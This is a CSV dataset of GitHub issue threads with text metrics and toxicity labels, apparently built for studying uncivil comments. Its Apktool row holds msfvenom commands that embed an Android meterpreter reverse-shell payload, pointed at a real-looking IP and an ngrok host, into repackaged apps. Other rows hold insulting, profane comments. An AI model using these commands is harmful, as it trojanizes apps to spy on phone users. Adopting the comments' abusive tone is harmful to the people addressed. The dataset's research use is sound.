_id,perspective_score,owner,repo,title,length,num_one_letter_word,num_non_alpha_in_middle,subjectivity,num_mention,comments,num_modal_word,total_reference,num_punct,stanford_polite,nltk_score,num_capital,num_QEMark,label,context
Apktool/iBotPeaches/1707,0.109625625,iBotPeaches,Apktool,Error: Unable to rebuild apk with apktool,7376,35,283,0.684210526,1,"I am using apktool v 2.3.1. on Kali Linux. I get this error. Yesterday I have tried and it worked, today I get this error with any APK, tried at least 10. "" Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.zumvr [] Loading /tmp/d20180110-6408-1ej4cd4/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6408-1ej4cd4/output.apk Error Unable to rebuild apk with apktool ""  Unfortunately apktool seems to be packaged into a 3rd party application here using apktool to pack some payload into an application. The reason for the build failure is not including in this stacktrace so nothing I can do here. Thanks for the report, but not enough details here for me to investigate.  What details do you need? I will provide because I really need to get this fixed  Generally every bit of details that the issue template requests. You removed it and just posted a stacktrace of a 3rd party tool that didn't even expose the stacktrace from Apktool. So generally useless for me. I would report this to whatever tool this is.  I am really sorry, I'm in a hurry. msfvenom -x Whatsappo.apk -p android/meterpreter/reverse_tcp LHOST=MY IPLPORT=6666 -o W.apk Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.megzx [] Loading /tmp/d20180110-6779-18jmnct/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6779-18jmnct/output.apk Error Unable to rebuild apk with apktool root@friend~/Desktop/MSF/Original APKS#  how to fix this error msfvenom -x /root/Desktop/Musixmatch.apk -p android/meterpreter/reverse_tcp LHOST=197.231.43.178 LPORT=6060 -o /root/Desktop/Musixmatchreload.apk Using APK template /root/Desktop/Musixmatch.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.musixmatch.android.lyrify.pnriw [] Loading /tmp/d20180528-4429-p0wqf6/original/smali/o/abm.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_FINE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SEND_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_COARSE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECEIVE_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding /root/Desktop/Musixmatch.apk with meterpreter injection as /tmp/d20180528-4429-p0wqf6/output.apk Error Unable to rebuild apk with apktool  really . is there no solution  Error Unable to rebuild apk with apktool  any one have a solution?  here you can solve the problem as i answered this question on stackoverflow Link To The Answer On Stack Over Flow  Error Unable to rebuild apk with apktool my apktool is already updated  I too have the same error root@friend~/Downloads# msfvenom -x myidea.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11560 -o /root/Desktop/myideafreerecharge.apk Using APK template myidea.apk [-] No platform was selected, choosing MsfModulePlatformAndroid from the payload [-] No arch selected, selecting arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.ideacellular.myidea.qwpse [] Loading /tmp/d20181112-9095-1hglxlh/original/smali/com/ideacellular/myidea/MyIdeaApplication.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [*] Rebuilding myidea.apk with meterpreter injection as /tmp/d20181112-9095-1hglxlh/output.apk Error Unable to rebuild apk with apktool my apktool is updated to latest version 2.3.4  i have updated the answer on StackOverflow Follow The mentioned link again.  already tried but not working  what didn't work ? did u injected manually and rebuilt your apk using ""android studio"" ?  i have updated my apktool by following ur steps  installed zipalign and tried my process as above  still getting the same error  as i said in ""In The End"" Part , if you still having the rebuilding problem , it's because of apktool that cannot rebuild large apk files, use lower size apk file (&lt;5MB) or use another tool for rebuilding your apk file and inject your Codes or files manually also.  another tools???  same problem when using 1.3 mb file ",5,63,753,0.105263158,0.210526316,593,7,n,
Applied-Energistics-2/AppliedEnergistics/3507,0.17057127,AppliedEnergistics,Applied-Energistics-2,EnderIO combined with AE2 and ThermalExpansion,1040,3,21,0.2,0,"  Description EnderIO does not replace all Flour-Items from AppliedEnergistics2. The Pulverizer from ThermalExpansion normally produces AppliedEnergistics2 Flour, but in combination with EnderIO it just produces AppliedEnergistics2 Disabled Item. All other grinders (like SAG-Mill, Grindstone, etc.) produce the EnderIO dustWheat. Environment Steps to reproduce  Install AppliedEnergistics2, ThermalExpansion and EnderIO Place a Pulverizer, power it and put Wheat in it. AppliedEnergistics2 Disabled Item is produced  EnderIO 1.12.2-5.0.21  EnderCore 1.12.2-0.5.18 Minecraft 1.12.2 Forge 14.23.3.2655 AppliedenErgistics2 rv5-stable-11 ThermalExpansion 1.12.2-5.4.2.25-universal   Oh never mind... Going to replace AE2 with Refined Storage and ask everyone with similar problems to do so as well... They at least respond to issue posts... And they don't have this and similar problems... Bye bye AE2  No need to become rude just because you are impatient. The devs are doing it for free and don't owe you shit so you are free to not use ae2 ",0,0,53,0,0.6,73,0,y,
Applied-Energistics-2/AppliedEnergistics/3800,0.107407905,AppliedEnergistics,Applied-Energistics-2,ConcurrentModificationException when loading into world,5301,23,210,0.5,1,"Whenever i load my world my fps stutters heavily and eventually the game freezes  When the game locks it never starts back up again, Using custom modpack i made in twitch client, in Singleplayer log  Version 1.12.2 AE2 Version rv6-stable-3 Forge Version 14.23.5.2770   Does this happen always? If so can you try and reduce the amount of mods to a mininum amount possible, or alternative remove just one or 2 until it no longer appears? On the first glance it looks like something tries to use multithreaded worldloading, which is just wrong and we are just the first mod affected by it and crash therefore.  Will do this evening  @friend what was your findings, having same problem in my quite random private SP pack  i couldnt find the mod causing it. No matter the combonation it seemed to happen at random and only in that world  Encountering this too. I have been trying for some days now on a reproduction method but cannot find the cause as of yet. ♠Time 1/7/19 323 AM Description Exception in server tick loop java.util.ConcurrentModificationException     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java634)     at net.minecraftforge.fml.common.FMLCommonHandler.onPostServerTick(FMLCommonHandler.java266)     at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java712)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java526)     at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows -- Head -- Thread Server thread Stacktrace     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677) -- Sponge PhaseTracker -- Details     Phase Stack [Empty stack] Stacktrace     at net.minecraft.server.MinecraftServer.handler$onCrashReport$zjk000(MinecraftServer.java3980)     at net.minecraft.server.MinecraftServer.func_71230_b(MinecraftServer.java889)     at net.minecraft.server.dedicated.DedicatedServer.func_71230_b(DedicatedServer.java371)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java558)     at java.lang.Thread.run(Unknown Source)  can you possibly test without sponge? other than that, this MAY be an power issue, try to add some dense enrgy cells to your network, it is possible that your system has too low capacity and stall during startup in an infinite loop ... and maybe sponge with some tick shenanigangs grinds it to a halt  OP wasn't using Sponge. Sponge has nothing to do with this error.  Was i referring to op?  I quoted your log and the advice was meant in general, how about being constructive and check for what i wrote?  Original poster. If you check his crash report, he's not using Sponge. It's just a bias towards Sponge and if someone is gonna to push bias in-front of me I'm going to slap you down. Stop it.  So in that case perhaps help us out a little. You did not post your whole log so we can not see what mods you have so we cannot look for mods you may have in common with the OP.  3812, #3831 Plenty of crash reports to build enough correlation. I don't understand the Sponge hate and it's completely unnecessary and off-topic. Suddenly people care about this because ""Sponge"". Really interesting.  Asking to try it without sponge is perfectly fine. It could easily be caused by some changes to chunkloading or similar system, which sponge likes to do and some other mod might simply include similar changes because they claimed it should be 5% faster but crashes in return. It would simply remove some variables and could make it easier. Or at least rule it out as possible cause. But it appears you are not actually interested in identifying a potential cause as well as reject a simple and quick request. So I do not see any chance to get something useful out of it from discussing it any further. ",12,1,307,0.083333333,0.333333333,266,5,y,
BEE2.4/BEEmod/937,0.07706064,BEEmod,BEE2.4,Prerelease 28 and 29 fail to build maps,3057,35,18,0.2,2,"This is a problem that many people have. It's a puzzle not building with prerelease 28 or 29. I never copied the output, but let's just say that it could even be blank and it will still fail. I'm trying right now to make a map that involves wall climbing. If you don't know what wall climbing is, you put a cube down to the corner of 2 walls, and put something ontop of it that's small, like a camera. I will try pre release 27 for this, and if it does have this issue, this needs to be fixed in prerelease 30 unless you can give me a fix.  When using BEE2.4 after installing a new version, old resources from past releases will not be overwritten, resulting in bugs that were fixed still being present and some things not working correctly. Your issue clearly seems te be related to this, so in order to solving this annoyance, you will have to do the following 1 - Open Beemod and click on . 2 - Wait 1 minute while Beemod removes their resources from Portal 2. 3 - Verify the Game Cache Files. 4 - Make sure to have downloaded and unzipped the latest Item's Packages and Application version of BEE2.4, and both must be from the same Pre-Release Version, otherwise bugs may occur. Links  (Application)   (Item's Packages) Note that if you are running Beemod on Linux or Mac Os X, or even on 32 Bit versions of Windows, issues can occur. Beemod currently works well only on 64 Bit versions of Windows 7, 8 and 10. 5 - Click on , then uncheck the option . 6 - Now choose your favorite Items &amp; Style and export your palette to the game. 7 - Make sure to save these steps in a text file in case you get similar issues in the future. 8 - Happy mapmaking!  Why close it? It’s possible that it won’t work.  This still didn't fix it, so who's the noob now? Give me the actual fix, you bitch.  Woah that came out of nowhere Icy. Calm yourself Lautaro's ways has worked for me and if its not working for you. You probably did something wrong. Or your items are placed in ways that break the map. Check the placement of items and their orientations. Make sure no items are behind/below partial blocks. etc.  it all checks out, I did all of the stuff he said, nothing works... But this error message came through. Get your ass ready though, it's quite long. compile errors.txt  That seems to be your issue but I dont know how to fix that. Ask Lautaro or someone  @friend Please no swearing there is no need for it.  Lol it is pretty fun for me to see when noobs gets mad so easily.  Uhmm... How about no? I am not the author of Beemod, the author is @friend, which is the one who works on the compiler thing. I am just a collaborator. PrayForNoobs  well I need a fix, I even had to have my friend fucking publish one of my levels for me, I don't want everything I make to be my friend's shit anymore.  @friend Please stop with the swearing there is no need for it.  In light of the Bee2 Contributing Guidelines, this issue is getting locked due to excessive fowl language and toxicity. Please do not repeat this behavior in future issues.  @friend Good thinking. ",9,1,109,0.4,0.2,91,4,y,
Contentify/Contentify/398,0.065378968,Contentify,Contentify,[Bug] Errors everywhere. Nothing works at all.,4863,47,12,0,0,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell.  Ok I found the mistake. Ever heard of case sensitive? Apperently not  Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names.  Closing this one. Please stick to constructional criticism if you want to get help.  The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements.  And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO  Oh also btw WoltLab and WordPress are also Open Source and they have way more features.  Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free.  No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one  But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you?  Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else.  Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I’d be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only “payment” is... if some say “thank you”, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it.  Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics).  @friend Do not listen to him this CMS is great and thanks for creating!  Update Contentify.org is officially GDPR compliant. ",7,2,135,0,0,159,4,y,
Croppie/Foliotek/587,0.15567564,Foliotek,Croppie,Warning! Do not use this plugin,1540,24,15,0.25,1,"I've spent 3 DAYS configuring this plugin to work nicely in a Bootstrap modal and the final result looks UGLY. It turned out that the plugin has numerous issues. In other cases, I'd fill detailed bug reports, but now I feel so desperate... I don't see any sense in posting issues that will duplicate existing ones. If you're reading this while choosing a JS plugin for image cropping, DO NOT USE CROPPIE!!! Go look for any better alternatives. The most important issues that I encountered  when input image is of type JPG and I try to get result (of type PNG by default), it produces a blank image. when  and  and image is zoomed in, it's possible to drag viewport bounds outside of the container bounds. it results in hidden viewport bounds and an overzoomed image; it's impossible for user to fix this, user is forced to refresh the whole page. when  it's impossible to make aspect ratio fixed.  Expected Behavior it works. Actual Behavior it doesn't.  Browser Chrome 71 Plugin version 2.6.2   Sorry you experienced issues with croppie.  I'll be the first to admit that I don't have as much time as I'd like to support this anymore. That being said, plenty of people use croppie with the bootstrap modals  you don't want to use Croppie, that's fine.  I honestly don't care.  But to post an insulting issue in an open source project that I (and several other people) have spent a lot of time building, and have been gracious enough to share with the community  .... is rude. Next time try just asking for help before you lose your temper. ",4,0,56,0.25,0.25,60,3,y,
Doomsday-Trail/AnthonyMarc23/1,0.07908532,AnthonyMarc23,Doomsday-Trail,worked on css and mobile responsiveness,21,0,1,0,0,@friend check it out ,0,0,1,0,0,0,0,n,
FastHub/k0shk0sh/2181,0.028964482,k0shk0sh,FastHub,Strings: Improve Wording & Grammar,357,1,1,0,0,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",0,0,10,0,0,8,0,n,
Flexbones/roikles/61,0.05597698,roikles,Flexbones,Taxonomy column in wp admin,262,3,3,0,0,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php  Fixed in 846dcdc ,1,0,3,0,0,3,0,n,
FrameworkBenchmarks/TechEmpower/1024,0.071699858,TechEmpower,FrameworkBenchmarks,Delete play-java/scala because they have been replaced by play2-java/scala,133,1,1,0,0,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015.  Ah, my bad. Thanks for cleaning it up ",0,0,7,0,0,5,0,n,
